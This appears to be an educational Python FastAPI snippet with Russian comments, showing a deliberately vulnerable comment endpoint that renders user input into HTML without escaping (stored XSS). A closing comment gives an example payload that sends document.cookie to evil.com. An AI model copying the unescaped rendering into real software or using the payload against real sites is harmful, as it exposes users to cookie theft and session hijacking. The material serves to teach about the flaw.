from typing import List
from pydantic import BaseModel
import uuid

# Модель для комментариев
class Comment(BaseModel):
    id: str
    author: str
    content: str

# "База данных" в памяти
comments_db: List[Comment] = []

@app.post("/comments/unsafe")
async def create_comment_unsafe(author: str = Form(...), content: str = Form(...)):
    """Уязвимое создание комментария с хранимым XSS"""
    comment = Comment(
        id=str(uuid.uuid4()),
        author=author,
        content=content
    )
    comments_db.append(comment)
    return {"message": "Комментарий добавлен"}

@app.get("/comments/unsafe", response_class=HTMLResponse)
async def list_comments_unsafe():
    """Уязвимое отображение комментариев"""
    if not comments_db:
        return HTMLResponse(content="<h1>Комментариев нет</h1>")
    
    # УЯЗВИМОСТЬ: прямое включение пользовательского ввода в HTML
    html_content = "<html><body><h1>Комментарии</h1><ul>"
    
    for comment in comments_db:
        html_content += f"""
        <li>
            <strong>{comment.author}</strong> сказал:
            <div>{comment.content}</div>
        </li>
        """
    
    html_content += """</ul>
    <form action="/comments/unsafe" method="post">
        Имя: <input type="text" name="author"><br>
        Комментарий: <textarea name="content"></textarea><br>
        <button type="submit">Отправить</button>
    </form>
    </body></html>"""
    
    return HTMLResponse(content=html_content)

# Пример эксплуатации:
# POST /comments/unsafe с данными:
# author=hacker&content=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>